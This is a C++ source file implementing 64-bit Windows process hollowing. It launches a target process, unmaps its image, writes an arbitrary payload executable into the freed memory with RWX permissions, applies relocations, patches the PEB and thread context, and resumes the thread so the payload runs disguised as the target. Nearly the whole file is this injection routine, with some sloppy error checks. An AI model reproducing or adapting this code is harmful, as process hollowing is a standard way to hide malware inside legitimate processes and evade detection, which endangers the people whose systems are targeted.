#include "Hollowing64Bit.hpp"
#include "NtdllFunctions.hpp"
#include <Windows.h>
#include <string>
#include <Ntsecapi.h>
#include <DbgHelp.h>
#include <stdint.h>
#include <iostream>

Hollowing64Bit::Hollowing64Bit(const std::string& targetPath, const std::string& payloadPath) :
    HollowingFunctions(targetPath, payloadPath)
{
    if (!AreProcessesCompatible())
    {   
        std::cout << "The processes are incompatible!" << std::endl;
        throw ""; // Replace with an exception class
    }

    if (!IsWindows64Bit())
    {
        std::cout << "Cannot work with 64 bit images on a 32 bit Windows build!" << std::endl;
        throw ""; // Replace with an exception class
    }
}

void Hollowing64Bit::hollow()
{
    std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl;

    PEB64 targetPEB = Read64BitProcessPEB(_targetProcessInformation.hProcess);

    const PIMAGE_DOS_HEADER payloadDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(_payloadBuffer);
    const PIMAGE_NT_HEADERS64 payloadNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(_payloadBuffer + payloadDOSHeader->e_lfanew);

    if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(targetPEB.ImageBaseAddress)))
    {
        std::cout << "206" << std::endl;
        // Exception
    }
    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress,
        payloadNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(nullptr == targetNewBaseAddress)
    {
        std::cout << "202 Error Code: " << GetLastError() << std::endl;
    }

    std::cout << "New base address: " << std::hex << targetNewBaseAddress << std::endl;

    WriteTargetProcessHeaders(targetNewBaseAddress, _payloadBuffer);

    UpdateTargetProcessEntryPoint(reinterpret_cast<PBYTE>(targetNewBaseAddress) + payloadNTHeaders->OptionalHeader.AddressOfEntryPoint);

    ULONGLONG delta = reinterpret_cast<intptr_t>(targetNewBaseAddress) - payloadNTHeaders->OptionalHeader.ImageBase;
    if(0 != delta)
    {
        RelocateTargetProcess(delta, targetNewBaseAddress);
        
        UpdateBaseAddressInTargetPEB(targetNewBaseAddress);
    }


    std::cout << "Resuming the target's main thread" << std::endl;
    
    NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);
}

void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
{
    const PIMAGE_DOS_HEADER sourceDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(sourceFileContents);
    const PIMAGE_NT_HEADERS64 sourceNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(sourceFileContents + sourceDOSHeader->e_lfanew);
    
    std::cout << "Writing headers" << std::endl;
    DWORD oldProtection = 0;
    SIZE_T writtenBytes = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || 0 != writtenBytes)
    {
        std::cout << "213" << std::endl;
    }
    // Updating the ImageBase field
    if(0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<LPBYTE>(targetBaseAddress) + sourceDOSHeader->e_lfanew +
        offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER64, ImageBase), &targetBaseAddress,
        sizeof(ULONGLONG), &writtenBytes) || 0 == writtenBytes)
    {
        std::cout << "82" << std::endl;
    }
    VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
        PAGE_READONLY, &oldProtection);

    for (int i = 0; i < sourceNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSection = reinterpret_cast<PIMAGE_SECTION_HEADER>(sourceFileContents + sourceDOSHeader->e_lfanew +
            sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        printf("Writing %s\n", currentSection->Name);
        NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(targetBaseAddress) +
            currentSection->VirtualAddress), (sourceFileContents + currentSection->PointerToRawData),
            currentSection->SizeOfRawData, nullptr);

        VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
            SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
    }
}

void Hollowing64Bit::UpdateTargetProcessEntryPoint(PVOID newEntryPointAddress)
{
    CONTEXT threadContext;
    threadContext.ContextFlags = CONTEXT_ALL;

    if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        std::cout << "169" << std::endl;
        // Exception
    }

    threadContext.Rcx = reinterpret_cast<intptr_t>(newEntryPointAddress);

    SetThreadContext(_targetProcessInformation.hThread, &threadContext);
}

PIMAGE_DATA_DIRECTORY Hollowing64Bit::GetPayloadDirectoryEntry(DWORD directoryID)
{
    const PIMAGE_DOS_HEADER payloadDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(_payloadBuffer);
    const PIMAGE_NT_HEADERS64 payloadNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(_payloadBuffer + payloadDOSHeader->e_lfanew);

    return &(payloadNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
}

PIMAGE_SECTION_HEADER Hollowing64Bit::FindTargetProcessSection(const std::string& sectionName)
{
    const PIMAGE_DOS_HEADER payloadDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(_payloadBuffer);
    const PIMAGE_NT_HEADERS64 payloadNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(_payloadBuffer + payloadDOSHeader->e_lfanew);
    char maxNameLengthHolder[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };  // According to WinAPI, the name of the section can
                                                                    // be as long as the size of the buffer, which means
                                                                    // it won't always have a terminating null byte, so
                                                                    // we include a spot for one at the end by ourselves.

    for (int i = 0; i < payloadNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(_payloadBuffer + payloadDOSHeader->e_lfanew +
            sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));

        if (0 != currentSectionHeader->Name[IMAGE_SIZEOF_SHORT_NAME - 1])
        {
            strncpy(maxNameLengthHolder, reinterpret_cast<char*>(currentSectionHeader->Name), IMAGE_SIZEOF_SHORT_NAME);
        }
        else
        {
            int nameLength = strlen(reinterpret_cast<char*>(currentSectionHeader->Name));
            strncpy(maxNameLengthHolder, reinterpret_cast<char*>(currentSectionHeader->Name), nameLength);
            maxNameLengthHolder[nameLength] = 0;
        }

        if (0 == strcmp(sectionName.c_str(), maxNameLengthHolder))
        {
            return currentSectionHeader;
        }
    }

    return nullptr;
    // Exception
}

void Hollowing64Bit::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress)
{
    PIMAGE_DATA_DIRECTORY relocData = GetPayloadDirectoryEntry(IMAGE_DIRECTORY_ENTRY_BASERELOC);
    DWORD dwOffset = 0;
    PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(".reloc");
    DWORD dwRelocAddr = relocSectionHeader->PointerToRawData;
    printf("249 Header name: %s\n", relocSectionHeader->Name);

    while (dwOffset < relocData->Size)
    {
        PBASE_RELOCATION_BLOCK pBlockHeader = reinterpret_cast<PBASE_RELOCATION_BLOCK>(&_payloadBuffer[dwRelocAddr + dwOffset]);

        DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);

        PBASE_RELOCATION_ENTRY pBlocks = reinterpret_cast<PBASE_RELOCATION_ENTRY>(&_payloadBuffer[dwRelocAddr + dwOffset + sizeof(BASE_RELOCATION_BLOCK)]);

        ProcessTargetRelocationBlock(pBlockHeader, pBlocks, processBaseAddress, baseAddressesDelta);

        dwOffset += pBlockHeader->BlockSize;
    }
}

void Hollowing64Bit::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRelocationBlock, PBASE_RELOCATION_ENTRY blockEntries,
    PVOID processBaseAddress, ULONGLONG baseAddressesDelta)
{
    DWORD entriesAmount = CountRelocationEntries(baseRelocationBlock->BlockSize);

    for (DWORD i = 0; i < entriesAmount; i++)
    {
        // The base relocation is skipped. This type can be used to pad a block.
        if (IMAGE_REL_BASED_ABSOLUTE != blockEntries[i].Type)
        {
            DWORD dwFieldAddress = baseRelocationBlock->PageAddress + blockEntries[i].Offset;
            ULONGLONG dwBuffer = 0;
            ReadProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
                &dwBuffer, sizeof(dwBuffer), nullptr);
            
            dwBuffer += baseAddressesDelta;

            if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
                &dwBuffer, sizeof(dwBuffer), nullptr))
            {
                std::cout << "265 Error Code: " << GetLastError() << std::endl;
            }
        }
    }
}

void Hollowing64Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
{
    CONTEXT threadContext;
    threadContext.ContextFlags = CONTEXT_ALL;

    if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        std::cout << "184" << std::endl;
        // Exception
    }

    SIZE_T writtenBytes = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(threadContext.Rdx + offsetof(PEB64, ImageBaseAddress)),
        &processNewBaseAddress, sizeof(ULONGLONG), &writtenBytes) || sizeof(ULONGLONG) != writtenBytes)
    {
        std::cout << "303" << std::endl;
    }
}

ULONG Hollowing64Bit::GetProcessSubsystem(HANDLE process)
{
    PEB64 processPEB = Read64BitProcessPEB(process);
    
    return processPEB.ImageSubsystem;
}

WORD Hollowing64Bit::GetPEFileSubsystem(const PBYTE fileBuffer)
{
    const PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(fileBuffer);
    const PIMAGE_NT_HEADERS64 ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(fileBuffer + dosHeader->e_lfanew);
    
    return ntHeaders->OptionalHeader.Subsystem;
}

bool Hollowing64Bit::AreProcessesCompatible()
{
    WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);

    return (_isTarget64Bit && _isPayload64Bit) && ((IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem) ||
        (payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)));
}